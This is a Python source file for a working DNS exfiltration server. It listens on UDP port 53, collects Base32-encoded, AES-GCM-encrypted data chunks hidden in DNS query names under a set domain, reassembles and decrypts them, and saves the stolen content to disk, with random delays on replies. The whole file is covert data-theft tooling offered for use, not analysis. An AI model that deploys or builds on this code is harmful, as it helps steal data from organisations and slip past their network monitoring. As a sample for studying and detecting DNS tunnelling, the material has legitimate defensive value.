#!/usr/bin/env python3
"""
Module Name: server.py

Description: DNS exfiltration server that receives Base32-encoded, AES-GCM encrypted data chunks in DNS queries,
reassembles the full Base32 string, decodes and decrypts the blob, then writes the plaintext to disk.

Author: John Burns
Date: 2024-04-30
Version: 1.4 (Full Base32 reassembly)
"""

import os
import threading
import struct
import socket
import base64
from collections import defaultdict
import argparse
import logging
import time
import random
from dnslib import DNSRecord, RR, QTYPE, A
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from dotenv import load_dotenv, find_dotenv
load_dotenv(find_dotenv())
# Logger setup
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger('main')

# AES-GCM key (32 bytes hex) loaded from env
KEY = bytes.fromhex(os.environ['EXFIL_KEY'])

def decrypt_data(blob: bytes) -> bytes:
    """
    Decrypt AES-GCM blob: nonce (12B) || ciphertext+tag
    """
    aesgcm = AESGCM(KEY)
    nonce = blob[:12]
    ct_tag = blob[12:]
    return aesgcm.decrypt(nonce, ct_tag, associated_data=None)

# Storage for payload strings per identifier
data_fragments = defaultdict(dict)
expected_counts = defaultdict(int)
last_seen = defaultdict(lambda: time.time())


def parse_dns_header(data):
    return struct.unpack('!6H', data[:12])[:2]


def parse_dns_query_section(data):
    offset = 12
    labels = []
    try:
        while True:
            length = data[offset]
            if length == 0:
                offset += 1
                break
            offset += 1
            labels.append(data[offset:offset+length].decode('ascii'))
            offset += length
        return '.'.join(labels)
    except Exception:
        return None


def handle_dns_request(data, addr, sock, args):
    dns_id, dns_flags = parse_dns_header(data)
    # Drop responses
    if (dns_flags >> 15) & 1:
        return

    raw_qname = parse_dns_query_section(data)
    if not raw_qname:
        logger.info("Failed to parse QNAME")
        return

    qname_nodot = raw_qname.rstrip('.')
    qname_compare = qname_nodot.lower()
    zone = args.domain.rstrip('.').lower()
    if not qname_compare.endswith('.' + zone):
        logger.info(f"Ignoring QNAME: {raw_qname}")
        return

    identifier_segment = qname_nodot[:-(len(zone) + 1)]
    # Rate-limit
    time.sleep(random.randint(args.low, args.high) / 1000)

    process_query(identifier_segment, args)
    send_dns_response(data, addr, sock)


def send_dns_response(data, addr, sock):
    try:
        req = DNSRecord.parse(data)
        reply = req.reply()
        reply.add_answer(RR(req.q.qname, QTYPE.A, rdata=A("192.0.2.1"), ttl=300))
        sock.sendto(reply.pack(), addr)
    except Exception as e:
        logger.error(f"Response error: {e}")


def process_query(identifier_segment, args):
    try:
        ident_raw, idx, total, payload = identifier_segment.split('-', 3)
    except ValueError:
        logger.info(f"Malformed segment: {identifier_segment}")
        return
    identifier = ident_raw.lower()
    idx = int(idx)
    total = int(total)
    expected_counts[identifier] = total

    logger.info(f"[{identifier}] Chunk {idx+1}/{total}")
    # Store raw Base32 payload string
    data_fragments[identifier][idx] = payload
    received = len(data_fragments[identifier])
    logger.info(f"[{identifier}] Received {received}/{total} chunks")

    if received == total:
        assemble_and_save(identifier, data_fragments.pop(identifier), args)
    # Timeout incompleted segments
    last_seen[identifier] = time.time()

def cleanup_expired_entries(ttl_seconds=600, interval=60):
    while True:
        now = time.time()
        expired = [key for key, ts in last_seen.items() if now - ts > ttl_seconds]
        for key in expired:
            data_fragments.pop(key, None)
            expected_counts.pop(key, None)
            last_seen.pop(key, None)
            logger.info(f"[{key}] Expired and removed from memory due to timeout.")
        time.sleep(interval)

def assemble_and_save(identifier, fragments, args):
    # Reassemble Base32 string
    full_b32 = ''.join(fragments[i] for i in sorted(fragments))
    # Pad to multiple of 8 for Base32
    pad_len = (8 - (len(full_b32) % 8)) % 8
    padded = full_b32 + ('=' * pad_len)

    try:
        encrypted_blob = base64.b32decode(padded, casefold=True)
    except Exception as e:
        logger.error(f"[{identifier}] Base32 decode failed: {e}")
        return

    try:
        plaintext = decrypt_data(encrypted_blob)
    except Exception as e:
        logger.error(f"[{identifier}] AES-GCM decrypt failed: {e}")
        return

    os.makedirs(args.output_dir, exist_ok=True)
    out_path = os.path.join(args.output_dir, f"{identifier}.bin")
    with open(out_path, 'wb') as f:
        f.write(plaintext)
    logger.info(f"[{identifier}] File saved: {out_path}")


def get_args():
    p = argparse.ArgumentParser(description="DNS Exfiltration Server")
    p.add_argument("--port", type=int, default=53)
    p.add_argument("--output-dir", default="output")
    p.add_argument("--low", type=int, default=100)
    p.add_argument("--high", type=int, default=1500)
    p.add_argument("--domain", default="xf.lockridgefoundation.com")
    return p.parse_args()


def start_server(args):
    threading.Thread(target=cleanup_expired_entries, daemon=True).start()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("", args.port))
    sock.settimeout(1)
    logger.info(f"Listening on UDP/{args.port}...")
    try:
        while True:
            try:
                data, addr = sock.recvfrom(4096)
            except socket.timeout:
                continue
            threading.Thread(target=handle_dns_request, args=(data, addr, sock, args), daemon=True).start()
    except KeyboardInterrupt:
        logger.info("Server stopping.")
    finally:
        sock.close()

if __name__ == "__main__":
    args = get_args()
    start_server(args)

